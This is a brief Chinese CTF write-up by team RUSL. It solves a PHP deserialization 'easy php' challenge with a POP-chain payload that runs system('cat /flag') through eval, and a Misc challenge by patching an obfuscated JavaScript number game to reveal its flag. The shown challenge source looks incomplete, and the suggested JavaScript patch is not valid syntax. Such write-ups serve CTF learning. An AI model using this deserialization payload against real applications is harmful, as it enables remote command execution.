# RUSL战队

```
1. 解题过程中，关键步骤不可省略，不可含糊其辞、一笔带过。
2. 解题过程中如是自己编写的脚本，不可省略，不可截图（代码字体可以调小；而如果代码太长，则贴关键代码函数）。
3. 您队伍所有解出的题目都必须书写WRITEUP，缺少一个则视该WRITEUP无效，队伍成绩将无效。
4. WRITEUP如过于简略和敷衍，导致无法形成逻辑链条推断出战队对题目有分析和解决的能力，该WRITEUP可能被视为无效，队伍成绩将无效。
5. 提交PDF版本即可
```

## 一、战队信息

- 名称：RUSL
- 排名：169

## 二、解题情况



### 三、解题过程

> 题目按照顺序填写

### Web

#### easy php

题目源码:

```php
<?php
class AAA{
    public $cmd;

    public function __call($name, $arguments){
        eval($this->cmd);
        return "done";
    }
}

class BBB{
    public $param1;

    public function __debuginfo(){
        return [
            'debugInfo' => 'param1' . $this->param1
        ];
    }
}

class CCC{
    public $func;

    public function __toString(){
        var_dump("aaa");
        $this->func->aaa();
    }
}
```

应对代码:

```php
<?php
class AAA{
    public $cmd;

    public function __construct()
    {
        $this->cmd="system('cat /flag');";
    }
}
class BBB{
    public $param1;
    public function __construct(){
        $this->param1=new CCC();
    }
}
class CCC{
    public $func;
    public function __construct(){
        $this->func=new AAA();
    }
}
$aaa=new CCC();
$bbb=new BBB();
echo(serialize($bbb));

```

**payload:ip.port/?aaa=O:3:"BBB":1:{s:6:"param1";O:3:"CCC":1:{s:4:"func";O:3:"AAA":1:{s:3:"cmd";s:20:"system(%27cat%20/flag%27);";}}}**

### PWN

### RE

### Crypto

### MISC

#### number game

很简单的一个number游戏.

```js
function _0x41b2() {
    var _0x581373 = ['random', '110weBJzg', '72Hfusyf', '3399gncQtP', 'fromCharCode', 'round', '57148oCRiuH', 'innerHTML', '565DHmrSB', '2543450CSzJEO', '295299TseKck', '40794iCQePa', '3062gGLIpQ', '9huxpnh', '30409884zfOaIf', 'toString', '15660bKtcCP'];
    _0x41b2 = function() {
        return _0x581373;
    }
    ;
    return _0x41b2();
}
(function(_0x6b2864, _0x325f4f) {
    var _0x19c61a = _0x359f
      , _0x596e22 = _0x6b2864();
    while (!![]) {
        try {
            var _0x410e5a = parseInt(_0x19c61a(0xd0)) / 0x1 * (-parseInt(_0x19c61a(0xd6)) / 0x2) + -parseInt(_0x19c61a(0xd1)) / 0x3 * (-parseInt(_0x19c61a(0xdb)) / 0x4) + parseInt(_0x19c61a(0xdd)) / 0x5 * (-parseInt(_0x19c61a(0xcf)) / 0x6) + -parseInt(_0x19c61a(0xde)) / 0x7 + -parseInt(_0x19c61a(0xd7)) / 0x8 * (parseInt(_0x19c61a(0xdf)) / 0x9) + -parseInt(_0x19c61a(0xd4)) / 0xa * (parseInt(_0x19c61a(0xd8)) / 0xb) + parseInt(_0x19c61a(0xd2)) / 0xc;
            if (_0x410e5a === _0x325f4f)
                break;
            else
                _0x596e22['push'](_0x596e22['shift']());
        } catch (_0x1b9b94) {
            _0x596e22['push'](_0x596e22['shift']());
        }
    }
}(_0x41b2, 0x79872));
function _0x359f(_0xa22008, _0x233420) {
    var _0x41b233 = _0x41b2();
    return _0x359f = function(_0x359fd1, _0xe2d6d7) {
        _0x359fd1 = _0x359fd1 - 0xcf;
        var _0x308121 = _0x41b233[_0x359fd1];
        return _0x308121;
    }
    ,
    _0x359f(_0xa22008, _0x233420);
}
function roll() {
    var _0x38f496 = _0x359f
      , _0x1afb7a = Math[_0x38f496(0xda)](Math[_0x38f496(0xd5)]() * 0x3e8);
    document['getElementById']('number')[_0x38f496(0xdc)] = _0x1afb7a[_0x38f496(0xd3)]();
    if (_0x1afb7a == 0x539) {
        var _0x14184c = [0x38, 0x6f, 0x1e, 0x24, 0x1, 0x32, 0x51, 0x45, 0x1, 0x3c, 0x24, 0xb, 0x55, 0x38, 0xa, 0x5d, 0x28, 0x12, 0x33, 0xb, 0x5d, 0x20, 0x1e, 0x46, 0x17, 0x3d, 0x10, 0x2a, 0x41, 0x44, 0x49, 0x1a, 0x31, 0x5a]
          , _0x477866 = '';
        for (var _0x6698b7 = 0x0; _0x6698b7 < _0x14184c['length']; _0x6698b7++)
            _0x477866 += String[_0x38f496(0xd9)](_0x14184c[_0x6698b7] ^ _0x6698b7 + 0x5a);
        alert(_0x477866);
    }
}

```

要输出flag,添加一条var _0x1afb7a == 0x539即可.

flag:`b4By_m1$c_@n3_b4By_f3On7eNd_731cK!`

